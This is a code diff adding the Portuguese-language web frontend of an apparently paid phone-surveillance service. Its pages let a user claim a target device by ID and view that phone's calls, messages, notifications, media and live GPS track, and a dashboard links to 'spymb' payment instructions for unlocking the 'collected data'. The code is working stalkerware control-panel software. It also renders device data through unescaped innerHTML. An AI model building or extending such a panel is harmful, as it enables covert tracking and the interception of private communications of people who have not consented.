+    const fileId = b.getAttribute('data-fileid');
+    try {
+      const res = await fetch('/api/media/download/' + encodeURIComponent(fileId), {
+        headers: { 'Authorization': 'Bearer ' + token }
+      });
+      if (!res.ok) {
+        const txt = await res.text();
+        alert('Erro ao descarregar: ' + txt);
+        return;
+      }
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      // abre numa nova janela/aba
+      window.open(url, '_blank');
+      // opcional: revoke depois de meia hora
+      setTimeout(() => URL.revokeObjectURL(url), 30*60*1000);
+    } catch (err) {
+      alert('Erro: ' + err.message);
+    }
+  });
+});
+    }
+
+    document.getElementById('btnRefresh').addEventListener('click', () => { loadDevices(); loadPayments(); });
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    // quick search
+    document.getElementById('deviceSearch').addEventListener('input', (e) => {
+      const q = (e.target.value || '').toLowerCase();
+      document.querySelectorAll('#devicesTable tbody tr').forEach(tr => {
+        const txt = tr.innerText.toLowerCase();
+        tr.style.display = txt.indexOf(q) !== -1 ? '' : 'none';
+      });
+    });
+
+    loadDevices();
+    loadPayments();
+
+  </script>
+</body>
+      </html>
+          
+
+web-frontend/css/styles.css
+/* styles.css - responsivo e limpo */
+:root{
+  --bg:#f6f8fb;
+  --card:#ffffff;
+  --muted:#6b7280;
+  --accent:#2563eb;
+  --accent-2:#0ea5a4;
+  --radius:10px;
+  --shadow: 0 6px 18px rgba(11,22,39,0.06);
+  --gutter:16px;
+  --maxwidth:1100px;
+  --font-sans: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+}
+
+*{box-sizing:border-box}
+html,body{height:100%;margin:0;background:var(--bg);font-family:var(--font-sans);color:#111827}
+.container{max-width:var(--maxwidth);margin:24px auto;padding:0 var(--gutter)}
+header h1{margin:0;font-size:1.25rem;color:#0f172a}
+.card{background:var(--card);padding:18px;border-radius:var(--radius);box-shadow:var(--shadow);margin-bottom:16px}
+.grid{display:grid;grid-template-columns:1fr;gap:16px}
+@media(min-width:900px){.grid{grid-template-columns: 1fr 1fr}}
+
+input[type="text"], input[type="number"], input[type="email"], input[type="password"], select, textarea {
+  width:100%;padding:10px;border:1px solid #e6e9ef;border-radius:8px;background:transparent;font-size:0.95rem;
+}
+button{cursor:pointer;padding:10px 14px;border-radius:8px;border:none;background:var(--accent);color:white;font-weight:600}
+button.secondary{background:#e6eefc;color:#0b2f6c}
+.small{font-size:0.9rem;color:var(--muted)}
+table{width:100%;border-collapse:collapse;font-size:0.95rem}
+table th{ text-align:left;color:#374151;padding:10px 8px;background:transparent }
+table td{padding:10px 8px;border-bottom:1px solid #eef2f7}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+
+/* social buttons */
+.btn {display:inline-block;padding:8px 12px;border-radius:8px;background:#111827;color:#fff;text-decoration:none}
+.social{background:#0ea5a4;padding:8px 12px;border-radius:8px;color:white}
+
+/* small layout helpers */
+.row{display:flex;gap:12px;align-items:center}
+.col{display:flex;flex-direction:column;gap:8px}
+
+/* responsive tweaks */
+@media (max-width:600px){
+  header h1{font-size:1rem}
+  .container{padding:0 12px}
+  button{width:100%}
+}
+
+/* map card fine-tune */
+#map{border-radius:8px;overflow:hidden}
+
+/* payments layout */
+dl{display:grid;grid-template-columns:120px 1fr;gap:6px 12px}
+
+
+web-frontend/js/api.js
+// simple api helper
+const API_BASE = '';
+
+function getAuthToken() {
+  return localStorage.getItem('auth_token') || null;
+}
+
+function authHeaders(headers = {}) {
+  const token = getAuthToken();
+  const h = Object.assign({}, headers);
+  if (token) h['Authorization'] = 'Bearer ' + token;
+  return h;
+}
+
+async function apiFetch(path, opts = {}) {
+  opts.headers = Object.assign({}, opts.headers || {});
+  // default JSON header unless body is FormData
+  if (!(opts.body instanceof FormData) && !opts.headers['Content-Type']) {
+    opts.headers['Content-Type'] = 'application/json';
+  }
+  // add auth header
+  opts.headers = authHeaders(opts.headers);
+  if (opts.body && typeof opts.body === 'object' && !(opts.body instanceof FormData)) {
+    opts.body = JSON.stringify(opts.body);
+  }
+  const r = await fetch(API_BASE + path, opts);
+  const text = await r.text();
+  try {
+    return JSON.parse(text);
+  } catch (e) {
+    return { ok:false, raw: text, status: r.status };
+  }
+}
+
+web-frontend/user/ calls.html
+<!doctype html>
+<html>
+<head><meta charset="utf-8"/><title>Chamadas</title><link rel="stylesheet" href="/css/styles.css"></head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between"><h1>Chamadas</h1><div><a href="/user/dashboard.html">Voltar</a> <button id="logout">Logout</button></div></header>
+    <div class="card"><label>DeviceId: <input id="deviceId" /></label><button id="btnLoad">Carregar</button></div>
+    <div class="card"><ul id="list" style="list-style:none;padding-left:0"></ul></div>
+  </div>
+  <script src="/js/api.js"></script>
+  <script>
+    if (!localStorage.getItem('auth_token')) location.href = '/';
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('deviceId')) document.getElementById('deviceId').value = params.get('deviceId');
+
+    document.getElementById('btnLoad').addEventListener('click', async () => {
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('DeviceId required');
+      const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/items?type=call', { method:'GET' });
+      const ul = document.getElementById('list'); ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + JSON.stringify(r) + '</li>'; return; }
+      r.items.forEach(it => {
+        const ts = new Date(it.ts).toLocaleString();
+        const p = it.payload || it;
+        const number = p.payload && p.payload.number ? p.payload.number : (p.number||'');
+        const dir = p.payload && p.payload.direction ? p.payload.direction : (p.direction||'');
+        const dur = p.payload && p.payload.duration ? p.payload.duration : (p.duration||'');
+        const li = document.createElement('li');
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small>${ts}</small><div><strong>Number:</strong> ${number}</div><div><strong>Direction:</strong> ${dir}</div><div><strong>Duration:</strong> ${dur}</div></div>`;
+        ul.appendChild(li);
+      });
+    });
+
+    if (document.getElementById('deviceId').value) document.getElementById('btnLoad').click();
+  </script>
+</body>
+</html>
+
+web-frontend/user/ dashboard.html
+  <!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>User Dashboard</title>
+  <link rel="stylesheet" href="/css/styles.css">
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <style>
+    .small { font-size:0.9em; color:#666; }
+    .grid { display:grid; grid-template-columns: 1fr; gap:12px; }
+    @media(min-width:900px){ .grid{grid-template-columns: 1fr 1fr;} }
+    .card{ background:#fff; padding:12px; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.06); }
+    input, button { padding:8px; margin:6px 0; width:100%; box-sizing:border-box; }
+    table td, table th { padding:6px; border-bottom:1px solid #eee; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between;align-items:center;margin:12px 0">
+      <h1>painel de controle do usuário </h1>
+      <div>
+        <button id="logout">Sair</button>
+      </div>
+    </header>
+<div class="grid">
+      <div class="card">
+        <h3>Instruções de pagamentos  </h3>
+        <div > para a activação e acesso aos dados colhidos veja as instruções de pagamentos <a href="https://spymb.onrender.com/payments_instructions.html">clicando aqui!</a> </div>
+      </div>
+    <div class="grid">
+      <div class="card">
+        <h3>Perfil </h3>
+        <div id="profileHtml">Loading profile...</div>
+      </div>
+
+      <div class="card">
+        <h3>Dispositivos </h3>
+
+        <div class="card" style="margin-bottom:12px">
+          <h4>Reivindicar dispositivo</h4>
+          <label>DeviceId: <input id="claimDeviceId" placeholder="Cole o DeviceId aqui" /></label>
+          <button id="btnClaim">Reivindicar</button>
+          <p id="claimMsg" class="small"></p>
+        </div>
+
+        <div style="margin-bottom:8px">
+          <a id="linkMap" href="#" >Ver Mapa</a> |
+          <a id="linkNotifications" href="#">Notificações</a> |
+          <a id="linkMessages" href="#">Mensagens</a> |
+          <a id="linkCalls" href="#">Chamadas</a> |
+          <a id="linkMedia" href="#">Media</a>
+        </div>
+
+        <table id="myDevices" style="width:100%;border-collapse:collapse">
+          <thead><tr><th>DeviceId</th><th>Name</th><th>Last Seen</th><th>Ações</th></tr></thead>
+          <tbody></tbody>
+        </table>
+      </div>
+    </div>
+
+    <div class="card" style="margin-top:12px">
+      <h3>Enviar comprovativo de pagamento</h3>
+      <input id="amount" type="number" placeholder="Amount" />
+      <input id="method" placeholder="Method (e.g. bank transfer)" />
+      <input id="note" placeholder="Note (optional)" />
+      <input id="file" type="file" />
+      <button id="sendPayment">Enviar</button>
+      <p id="payMsg" class="small"></p>
+    </div>
+
+    <div class="card" style="margin-top:12px">
+      <h3>Meus Pagamentos</h3>
+      <table id="myPayments" style="width:100%;border-collapse:collapse">
+        <thead><tr><th>ID</th><th>Amount</th><th>Status</th><th>Created</th><th>Comprovativo</th></tr></thead>
+        <tbody></tbody>
+      </table>
+    </div>
+
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    // ---------- setup ----------
+    const token = localStorage.getItem('auth_token');
+    if (!token) { location.href = '/'; }
+
+    document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+
+    // ---------- helpers ----------
+    function getPrimaryDeviceIdFromTable() {
+      const tbody = document.querySelector('#myDevices tbody');
+      const firstRow = tbody.querySelector('tr');
+      if (!firstRow) return null;
+      const firstCell = firstRow.querySelector('td');
+      if (!firstCell) return null;
+      return firstCell.textContent.trim();
+    }
+
+    function openWithTokenBlob(url, filenameHint) {
+      return fetch(url, { headers: { 'Authorization': 'Bearer ' + token } })
+        .then(async res => {
+          if (!res.ok) {
+            const txt = await res.text();
+            throw new Error(txt || ('status ' + res.status));
+          }
+          return res.blob();
+        })
+        .then(blob => {
+          const urlObj = URL.createObjectURL(blob);
+          window.open(urlObj, '_blank');
+          // revoke later
+          setTimeout(()=> URL.revokeObjectURL(urlObj), 30*60*1000);
+        });
+    }
+
+    // ---------- profile ----------
+    async function loadProfile() {
+      const r = await apiFetch('/api/auth/me', { method:'GET' });
+      const el = document.getElementById('profileHtml');
+      if (!r.ok) { el.innerText = 'Erro: ' + (r.error || JSON.stringify(r)); return; }
+      const user = r.user;
+      el.innerHTML = `
+        <div><strong>Name:</strong> ${user.name || '-'}</div>
+        <div><strong>Email:</strong> ${user.email || '-'}</div>
+        <div><strong>Role:</strong> ${user.role || '-'}</div>
+        <div><strong>Active:</strong> ${user.active ? 'Yes' : 'No'}</div>
+      `;
+      // if not active, add note
+      if (!user.active) el.insertAdjacentHTML('beforeend','<div class="small" style="color:#a00;margin-top:6px">Conta não activa. Paga para ver dados.</div>');
+      return user;
+    }
+
+    // ---------- devices ----------
+    async function loadMyDevices() {
+      const r = await apiFetch('/api/devices/my', { method:'GET' });
+      const tbody = document.querySelector('#myDevices tbody');
+      tbody.innerHTML = '';
+      if (!r.ok) { tbody.innerHTML = '<tr><td colspan="4">Erro: ' + (r.error||JSON.stringify(r)) + '</td></tr>'; return; }
+      r.devices.forEach(d => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${d.deviceId}</td>
+          <td>${d.name || ''}</td>
+          <td>${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : '-'}</td>
+          <td><button data-id="${d.deviceId}" class="btnView">Ver</button></td>
+        `;
+        tbody.appendChild(tr);
+      });
+
+      // attach handlers (delegated would also work)
+      document.querySelectorAll('.btnView').forEach(b => {
+        b.addEventListener('click', () => {
+          const id = b.getAttribute('data-id');
+          window.location = '/user/device.html?deviceId=' + encodeURIComponent(id);
+        });
+      });
+    }
+
+    // ---------- claim ----------
+    document.getElementById('btnClaim').addEventListener('click', async () => {
+      const id = document.getElementById('claimDeviceId').value.trim();
+      if (!id) { document.getElementById('claimMsg').innerText = 'Insere deviceId'; return; }
+      document.getElementById('claimMsg').innerText = 'A reivindicar...';
+      const res = await apiFetch('/api/devices/' + encodeURIComponent(id) + '/claim', { method: 'POST' });
+      if (res.ok) {
+        document.getElementById('claimMsg').innerText = 'Device reivindicado com sucesso.';
+        document.getElementById('claimDeviceId').value = '';
+        await loadMyDevices();
+      } else {
+        document.getElementById('claimMsg').innerText = 'Erro: ' + (res.error || JSON.stringify(res));
+      }
+    });
+
+    // ---------- payments ----------
+    async function loadMyPayments() {
+      const r = await apiFetch('/api/payments/mine', { method:'GET' });
+      const tbody = document.querySelector('#myPayments tbody');
+      tbody.innerHTML = '';
+      if (!r.ok) { tbody.innerHTML = '<tr><td colspan="5">Erro: ' + (r.error||JSON.stringify(r)) + '</td></tr>'; return; }
+      r.payments.forEach(p => {
+        const tr = document.createElement('tr');
+        const mediaCell = p.mediaFileId
+          ? `<button class="btnViewPaymentMedia" data-fileid="${p.mediaFileId}">Ver</button>`
+          : '-';
+        tr.innerHTML = `
+          <td>${p._id}</td>
+          <td>${p.amount || ''} ${p.currency || ''}</td>
+          <td>${p.status}</td>
+          <td>${new Date(p.createdAt).toLocaleString()}</td>
+          <td>${mediaCell}</td>
+        `;
+        tbody.appendChild(tr);
+      });
+
+      // attach handlers for media
+      document.querySelectorAll('.btnViewPaymentMedia').forEach(b => {
+        b.addEventListener('click', async () => {
+          const fileId = b.getAttribute('data-fileid');
+          try {
+            await openWithTokenBlob('/api/media/download/' + encodeURIComponent(fileId));
+          } catch (err) {
+            alert('Erro ao abrir comprovativo: ' + (err.message || err));
+          }
+        });
+      });
+    }
+
+    // ---------- send payment (upload file then create) ----------
+    document.getElementById('sendPayment').addEventListener('click', async () => {
+      const fileEl = document.getElementById('file');
+      const amount = parseFloat(document.getElementById('amount').value || 0);
+      const method = document.getElementById('method').value;
+      const note = document.getElementById('note').value;
+      if (fileEl.files.length === 0) { document.getElementById('payMsg').innerText = 'Escolhe um ficheiro'; return; }
+      document.getElementById('payMsg').innerText = 'Enviando...';
+      const form = new FormData();
+      form.append('media', fileEl.files[0]);
+
+      try {
+        // upload (endpoint must accept Authorization header)
+        const uploadRes = await fetch('/api/media/payment/upload', {
+          method: 'POST',
+          headers: { 'Authorization': 'Bearer ' + token },
+          body: form
+        }).then(r => r.json());
+
+        if (!uploadRes.ok) { document.getElementById('payMsg').innerText = 'Upload failed: ' + JSON.stringify(uploadRes); return; }
+
+        const mediaFileId = uploadRes.fileId;
+        const createRes = await apiFetch('/api/payments', { method:'POST', body: { amount, method, note, mediaFileId } });
+        if (createRes.ok) {
+          document.getElementById('payMsg').innerText = 'Pagamento enviado. ID: ' + createRes.id;
+          fileEl.value = '';
+          document.getElementById('amount').value = '';
+          document.getElementById('method').value = '';
+          document.getElementById('note').value = '';
+          await loadMyPayments();
+        } else {
+          document.getElementById('payMsg').innerText = 'Erro ao criar pagamento: ' + JSON.stringify(createRes);
+        }
+      } catch (err) {
+        document.getElementById('payMsg').innerText = 'Erro: ' + err.message;
+      }
+    });
+
+    // ---------- link handlers (map/notifications/messages/calls/media) ----------
+    // behavior:
+    //  - if user has at least one device, use the first deviceId from the table
+    //  - else prompt for deviceId
+    function chooseDeviceIdOrPrompt() {
+      let id = getPrimaryDeviceIdFromTable();
+      if (!id) id = prompt('Insere o deviceId que queres visualizar:');
+      return id;
+    }
+
+    document.getElementById('linkMap').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = chooseDeviceIdOrPrompt();
+      if (id) window.location = '/user/map.html?deviceId=' + encodeURIComponent(id);
+    });
+    document.getElementById('linkNotifications').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = chooseDeviceIdOrPrompt();
+      if (id) window.location = '/user/notifications.html?deviceId=' + encodeURIComponent(id);
+    });
+    document.getElementById('linkMessages').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = chooseDeviceIdOrPrompt();
+      if (id) window.location = '/user/messages.html?deviceId=' + encodeURIComponent(id);
+    });
+    document.getElementById('linkCalls').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = chooseDeviceIdOrPrompt();
+      if (id) window.location = '/user/calls.html?deviceId=' + encodeURIComponent(id);
+    });
+    document.getElementById('linkMedia').addEventListener('click', (e) => {
+      e.preventDefault();
+      const id = chooseDeviceIdOrPrompt();
+      if (id) window.location = '/user/media.html?deviceId=' + encodeURIComponent(id);
+    });
+
+    // ---------- init ----------
+    (async function(){
+      await loadProfile();
+      await loadMyDevices();
+      await loadMyPayments();
+    })();
+
+  </script>
+</body>
+</html>
+
+web-frontend/user/ device.html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/><title>My Device</title>
+  <link rel="stylesheet" href="/css/styles.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <style>#map{height:420px}</style>
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between">
+      <h1>My Device</h1>
+      <div><a href="/user/dashboard.html">Back</a> <button id="logout">Logout</button></div>
+    </header>
+
+    <div class="card" id="deviceInfo">Loading...</div>
+    <div id="map" class="card"></div>
+    <div class="card">
+      <h3>History</h3>
+      <ul id="historyList" style="list-style:none;padding-left:0"></ul>
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const deviceId = params.get('deviceId');
+    if (!deviceId) { alert('deviceId missing'); location.href='/user/dashboard.html'; }
+    const token = localStorage.getItem('auth_token');
+    if (!token) { location.href='/'; }
+
+    async function loadDevice(){
+      const r = await apiFetch('/api/devices/' + encodeURIComponent(deviceId), { method:'GET' });
+      const el = document.getElementById('deviceInfo');
+      if (!r.ok) { el.innerText = 'Erro: ' + (r.error || JSON.stringify(r)); return; }
+      const d = r.device;
+      el.innerHTML = `<strong>DeviceId:</strong> ${d.deviceId} <br>
+                      <strong>Name:</strong> ${d.name || '-'} <br>
+                      <strong>Last seen:</strong> ${d.lastSeen ? new Date(d.lastSeen).toLocaleString() : '-'}`;
+    }
+
+    async function loadHistory(){
+      const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/history', { method:'GET' });
+      const ul = document.getElementById('historyList');
+      ul.innerHTML = '';
+      if (!r.ok) { ul.innerHTML = '<li>Erro: ' + (r.error||JSON.stringify(r)) + '</li>'; return; }
+      r.items.forEach(item => {
+        const li = document.createElement('li');
+        const ts = new Date(item.ts).toLocaleString();
+        li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small class="small">${ts}</small><div>${JSON.stringify(item.payload)}</div></div>`;
+        ul.appendChild(li);
+      });
+    }
+
+    let map, marker;
+    function initMap(lat=0, lon=0) {
+      if (!map) {
+        map = L.map('map').setView([lat, lon], lat===0&&lon===0?2:13);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
+        marker = L.marker([lat, lon]).addTo(map);
+      } else {
+        map.setView([lat, lon], 13);
+        marker.setLatLng([lat, lon]);
+      }
+    }
+
+    (async function(){
+      await loadDevice();
+      const items = await loadHistory();
+      if (items && items.length>0) {
+        const first = items[0];
+        const loc = first.payload && first.payload.location;
+        if (loc && loc.lat && loc.lon) initMap(loc.lat, loc.lon);
+        else initMap(0,0);
+      } else initMap(0,0);
+
+      const socket = io();
+      socket.emit('join_device_room', deviceId);
+      socket.on('telemetry', (data) => {
+        if (data && data.payload && data.payload.location) {
+          const loc = data.payload.location;
+          initMap(loc.lat, loc.lon);
+          const ul = document.getElementById('historyList');
+          const li = document.createElement('li');
+          li.innerHTML = `<div style="padding:8px;border-bottom:1px solid #eee"><small class="small">${new Date(data.ts).toLocaleString()}</small><div>${JSON.stringify(data.payload)}</div></div>`;
+          ul.insertBefore(li, ul.firstChild);
+        }
+      });
+
+      document.getElementById('logout').addEventListener('click', ()=>{ localStorage.clear(); location.href='/' });
+    })();
+  </script>
+</body>
+</html>
+
+web-frontend/user/map.html
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>Mapa do Dispositivo — Visualização</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <link rel="stylesheet" href="/css/styles.css">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body{margin:0;font-family:Inter,system-ui,Arial,sans-serif}
+    .container{max-width:1100px;margin:12px auto;padding:12px}
+    #map{height:60vh;min-height:320px;border-radius:8px;box-shadow:0 6px 18px rgba(11,22,39,0.06)}
+    .card{background:#fff;padding:12px;border-radius:10px;margin-bottom:12px;box-shadow:0 6px 18px rgba(11,22,39,0.04)}
+    .controls{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+    input,select{padding:8px;border-radius:8px;border:1px solid #e6e9ef}
+    button{padding:8px 12px;border-radius:8px;border:none;background:#2563eb;color:#fff}
+    .small{font-size:0.9rem;color:#6b7280}
+    .list-item{padding:8px;border-bottom:1px solid #eee}
+    .toggle{display:inline-flex;align-items:center;gap:8px}
+    @media(max-width:600px){ .controls{flex-direction:column} button{width:100%} }
+  </style>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <header style="display:flex;justify-content:space-between;align-items:center">
+      <h2>Mapa do Dispositivo</h2>
+      <div><a href="/user/dashboard.html">Voltar</a> <button id="logout">Logout</button></div>
+    </header>
+
+    <div class="card">
+      <div class="controls">
+        <input id="deviceId" placeholder="Cole aqui o deviceId (ou abrir com ?deviceId=...)" />
+        <select id="timeRange" title="Filtro temporal">
+          <option value="24h">Últimas 24h</option>
+          <option value="1h">Última 1h</option>
+          <option value="7d">Últimos 7 dias</option>
+          <option value="all">Todo histórico</option>
+        </select>
+        <div class="toggle">
+          <label><input type="checkbox" id="realtimeToggle" checked /> Realtime</label>
+        </div>
+        <label style="display:flex;align-items:center;gap:8px"><input type="checkbox" id="autoRefresh" /> Auto-refresh (30s)</label>
+        <button id="btnLoad">Carregar</button>
+        <button id="btnClear" style="background:#eef6ff;color:#0b2f6c">Limpar</button>
+      </div>
+      <div style="margin-top:8px" id="status" class="small">Pronto</div>
+    </div>
+
+    <div id="map" class="card"></div>
+
+    <div class="card">
+      <h3>Últimos pontos</h3>
+      <ul id="list" style="list-style:none;padding-left:0;margin:0;max-height:220px;overflow:auto"></ul>
+    </div>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    // util
+    function toNum(v){ if (v===null||v===undefined) return NaN; if (typeof v==='number') return v; return parseFloat(String(v).replace(',', '.')) }
+    function fmt(ts){ try { return new Date(Number(ts)).toLocaleString(); } catch(e) { return String(ts) } }
+
+    // extractor para o formato real: items[i].payload.payload.location
+    function extractLocation(item) {
+      if (typeof item === 'string') {
+        try { item = JSON.parse(item); } catch(e) {}
+      }
+      // caso comum: item.payload.payload.location
+      const p1 = item && (item.payload || item['payload']);
+      const p2 = p1 && (p1.payload || p1['payload']);
+      const finalPl = p2 || p1 || item;
+      const loc = finalPl && (finalPl.location || finalPl.localizacao || finalPl['localização'] || finalPl.loc);
+      let lat = NaN, lon = NaN, acc = null, ts = null;
+      if (loc) {
+        lat = toNum(loc.lat || loc.latitude);
+        lon = toNum(loc.lon || loc.longitude);
+        acc = loc.accuracy || loc.precision || loc.precisao;
+      } else {
+        lat = toNum(finalPl.lat || finalPl.latitude);
+        lon = toNum(finalPl.lon || finalPl.longitude);
+        acc = finalPl.accuracy || finalPl.precision;
+      }
+      ts = (finalPl && (finalPl.ts || finalPl.time || finalPl.timestamp)) || (item && (item.ts || item.time)) || Date.now();
+      return { lat, lon, acc, ts, raw: item };
+    }
+
+    // map state
+    let map=null, markers=[], lastMarker=null, poly=null, latlngs=[];
+    let socket=null, currentDevice=null, autoRefreshHandle=null;
+
+    function ensureMap(){
+      if (!map) {
+        map = L.map('map').setView([0,0], 2);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom:19 }).addTo(map);
+      }
+    }
+
+    function clearAll(){
+      if (!map) ensureMap();
+      markers.forEach(m=>map.removeLayer(m)); markers=[];
+      if (lastMarker){ map.removeLayer(lastMarker); lastMarker=null; }
+      if (poly){ map.removeLayer(poly); poly=null; }
+      latlngs=[];
+      document.getElementById('list').innerHTML='';
+      document.getElementById('status').innerText='Limpo';
+      if (socket) { try{ socket.emit('leave_device_room', currentDevice); }catch(e){} try{ socket.disconnect(); }catch(e){} socket=null; currentDevice=null; }
+      if (autoRefreshHandle) { clearInterval(autoRefreshHandle); autoRefreshHandle = null; }
+    }
+
+    function addPoint(lat, lon, acc, ts, openPopup){
+      const la = Number(lat), lo = Number(lon); if (!isFinite(la) || !isFinite(lo)) return;
+      const m = L.circleMarker([la, lo], { radius:6, color:'#1976d2', fillColor:'#1976d2', fillOpacity:0.9 }).addTo(map);
+      const popup = `<div style="min-width:160px"><div><strong>${fmt(ts)}</strong></div><div>Accuracy: ${acc||'-'}</div><div style="margin-top:6px"><a href="https://www.google.com/maps/search/?api=1&query=${la},${lo}" target="_blank">Abrir no Google Maps</a></div></div>`;
+      m.bindPopup(popup);
+      markers.push(m);
+      latlngs.push([la, lo]);
+
+      if (poly) map.removeLayer(poly);
+      if (latlngs.length >= 2) poly = L.polyline(latlngs, { color:'#2563eb', weight:4, opacity:0.9 }).addTo(map);
+
+      if (lastMarker) { map.removeLayer(lastMarker); lastMarker=null; }
+      lastMarker = L.circleMarker([la, lo], { radius:9, color:'#16a34a', fillColor:'#16a34a', fillOpacity:0.95 }).addTo(map);
+      lastMarker.bindPopup(popup);
+      if (openPopup) try{ lastMarker.openPopup(); }catch(e){}
+    }
+
+    function prependList(lat, lon, acc, ts){
+      const ul = document.getElementById('list');
+      const li = document.createElement('li');
+      li.className = 'list-item';
+      li.innerHTML = `<strong>${fmt(ts)}</strong><div>Lat: ${Number(lat).toFixed(6)} Lon: ${Number(lon).toFixed(6)}</div><div>Accuracy: ${acc||'-'}</div><div style="margin-top:6px"><a href="https://www.google.com/maps/search/?api=1&query=${lat},${lon}" target="_blank">Abrir no Google Maps</a></div>`;
+      ul.insertBefore(li, ul.firstChild);
+    }
+
+    // apply time filter: '1h','24h','7d','all'
+    function filterByTime(items, range) {
+      if (range === 'all') return items;
+      const now = Date.now();
+      let cutoff = 0;
+      if (range === '1h') cutoff = now - 1000*60*60;
+      else if (range === '24h') cutoff = now - 1000*60*60*24;
+      else if (range === '7d') cutoff = now - 1000*60*60*24*7;
+      return items.filter(it => {
+        const loc = extractLocation(it);
+        const ts = Number(loc.ts || Date.now());
+        return ts >= cutoff;
+      });
+    }
+
+    // load history from backend, filter and draw
+    async function loadOnce() {
+      const deviceId = document.getElementById('deviceId').value.trim();
+      if (!deviceId) return alert('Insira deviceId');
+      ensureMap();
+      // clear visual markers (keep map)
+      markers.forEach(m=>map.removeLayer(m)); markers=[]; if (lastMarker){ map.removeLayer(lastMarker); lastMarker=null; } if (poly){ map.removeLayer(poly); poly=null; } latlngs=[]; document.getElementById('list').innerHTML=''; document.getElementById('status').innerText='Carregando...';
+
+      try {
+        const r = await apiFetch('/api/telemetry/' + encodeURIComponent(deviceId) + '/items?type=telemetry', { method:'GET' });
+        // extract items array (tolerant)
+        let items = [];
+        if (!r) items = [];
+        else if (Array.isArray(r)) items = r;
+        else if (r.items && Array.isArray(r.items)) items = r.items;
+        else if (r.data && Array.isArray(r.data)) items = r.data;
+        else if (r.payload && Array.isArray(r.payload)) items = r.payload;
+        else items = r.items || [];
+
+        // apply temporal filter
+        const range = document.getElementById('timeRange').value;
+        const filtered = filterByTime(items, range);
+
+        // normalize & collect pts
+        const pts = [];
+        for (let i=0;i<filtered.length;i++){
+          const p = extractLocation(filtered[i]);
+          if (isFinite(Number(p.lat)) && isFinite(Number(p.lon))) pts.push(p);
+        }
+
+        if (pts.length === 0) {
+          document.getElementById('status').innerText = 'Nenhum ponto com lat/lon no período selecionado';
+          map.setView([0,0], 2);
+        } else {
+          pts.sort((a,b) => Number(a.ts) - Number(b.ts));
+          pts.forEach(pt => addPoint(pt.lat, pt.lon, pt.acc, pt.ts, false));
+          const last = pts[pts.length-1];
+          setTimeout(()=>{ try{ map.fitBounds(latlngs, { padding:[40,40], maxZoom:16 }); } catch(e) { map.setView([Number(last.lat), Number(last.lon)], 13); } }, 120);
+          for (let i=pts.length-1;i>=0;i--) prependList(pts[i].lat, pts[i].lon, pts[i].acc, pts[i].ts);
+          document.getElementById('status').innerText = 'OK — ' + pts.length + ' pontos (última atualização: ' + fmt(Date.now()) + ')';
+        }
+      } catch (err) {
+        console.error('loadOnce err', err);
+        document.getElementById('status').innerText = 'Erro ao carregar histórico';
+      }
+    }
+
+    // realtime socket handling
+    function startRealtime(deviceId) {
+      if (socket) return;
+      socket = io(window.location.origin, { transports:['websocket','polling'] });
+      currentDevice = deviceId;
+      socket.on('connect', ()=>{ console.log('socket connected', socket.id); socket.emit('join_device_room', deviceId); document.getElementById('status').innerText = 'Realtime ligado'; });
+      socket.on('telemetry', data => handleRealtimeData(data));
+      socket.on('telemetria', data => handleRealtimeData(data)); // fallback
+      socket.onAny((ev,p) => console.debug('socket event', ev, p));
+    }
+    function stopRealtime() {
+      if (!socket) return;
+      try { socket.emit('leave_device_room', currentDevice); } catch(e) {}
+      try { socket.disconnect(); } catch(e) {}
+      socket = null; currentDevice = null;
+      document.getElementById('status').innerText = 'Realtime desligado';
+    }
+
+    function handleRealtimeData(data) {
+      try {
+        const p = extractLocation(data);
+        if (!isFinite(Number(p.lat)) || !isFinite(Number(p.lon))) return;
+        // apply current time filter: if incoming timestamp is outside filter, ignore
+        const range = document.getElementById('timeRange').value;
+        if (range !== 'all') {
